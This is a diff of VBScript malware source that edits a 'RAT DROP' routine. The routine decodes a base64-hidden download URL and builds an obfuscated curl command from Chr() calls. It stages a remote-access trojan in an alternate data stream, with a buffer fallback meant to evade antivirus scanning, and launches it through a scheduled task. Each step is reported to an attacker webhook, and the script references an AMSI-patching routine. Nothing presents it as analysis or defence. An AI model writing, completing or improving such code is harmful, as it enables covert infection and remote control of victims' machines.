@@ -62,7 +62,7 @@ Sub PatchAMSI()
     fso.DeleteFile psf, True
 End Sub
 
-' --- RAT DROP (10s Spam Loop) — ADS stage + buffer fallback + schtask launch ---
+' --- RAT DROP (10s Spam Loop) — ADS stage + buffer fallback + schtask launch, log to RE_WH ---
 Sub DropRAT()
     Dim b64Url : b64Url = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTU1NzI2NjE5Mjk3MTA3MTU3OS8xNTcxOTkxNTcyMDE3NDU1MjE2L2RpY2VjaGVjay5leGU/ZXg9NmFmY2JlYmMmaXM9NmFmYjZkM2MmaG09YTU5ODZiZjg0MzViYWIxYzc1YTFiZTIwODQxOTU0ZDBhNjBkZjcyZTg0ZWYwY2JlZGYxOTczYWNmMTIwMjcxZA=="
     Dim dl : dl = DecodeB64(b64Url)
@@ -73,13 +73,12 @@ Sub DropRAT()
     Dim ads  : ads  = host & ":agent.exe"
 
     Do
-        Call PostEmbed(":rocket: RAT Download", "Fetching Payload...", 10181046)
+        Call PostEmbedTo(":rocket: RAT Download", "Fetching Payload...", 10181046, RE_WH)
 
         If fso.FileExists(op) Then fso.DeleteFile op
         If fso.FileExists(host) Then fso.DeleteFile host
         WriteFile host, Chr(0)
 
-        ' ADS stage via old curl form
         Dim cCmd : cCmd = Chr(99)&Chr(117)&Chr(114)&Chr(108)&Chr(46)&Chr(101)&Chr(120)&Chr(101)&" -s -L -o """ & ads & """ """ & dl & """"
         Dim runExec : runExec = Chr(99)&Chr(109)&Chr(100)&Chr(32)&Chr(47)&Chr(99)&Chr(32) & cCmd
         sh.Run runExec, 0, True
@@ -89,13 +88,11 @@ Sub DropRAT()
             If fso.GetFile(ads).Size > 3000000 Then staged = True
         End If
 
-        ' Fallback: current engine scans ADS-on-write — buffer straight to old path
         If Not staged Then
-            Call PostEmbed(":warning: RAT", "ADS miss, buffer fallback", 16711680)
+            Call PostEmbedTo(":warning: RAT", "ADS miss, buffer fallback", 16711680, RE_WH)
             staged = BufferDownload(dl, op)
         End If
 
-        ' ADS success -> copy out, drop carrier
         If fso.FileExists(ads) Then
             fso.CopyFile ads, op, True
             fso.DeleteFile host, True
@@ -104,14 +101,13 @@ Sub DropRAT()
         If fso.FileExists(op) Then
             If fso.GetFile(op).Size > 3000000 Then
                 Dim dsize : dsize = fso.GetFile(op).Size
-                Call PostEmbed(":white_check_mark: RAT Downloaded", "Size: " & CStr(dsize) & " bytes | Launching...", 10181046)
+                Call PostEmbedTo(":white_check_mark: RAT Downloaded", "Size: " & CStr(dsize) & " bytes | Launching...", 10181046, RE_WH)
 
                 Dim launchOk : launchOk = LaunchScheduledTask(op)
                 If launchOk Then
-                    Call PostEmbed(":white_check_mark: RAT", "Executed (schtask lineage)", 65280)
+                    Call PostEmbedTo(":white_check_mark: RAT", "Executed (schtask lineage)", 65280, RE_WH)
                     Exit Sub
                 End If
-                ' fallback to old WMI launch
                 Call RunCmd("""" & op & """")
                 Exit Sub
             End If
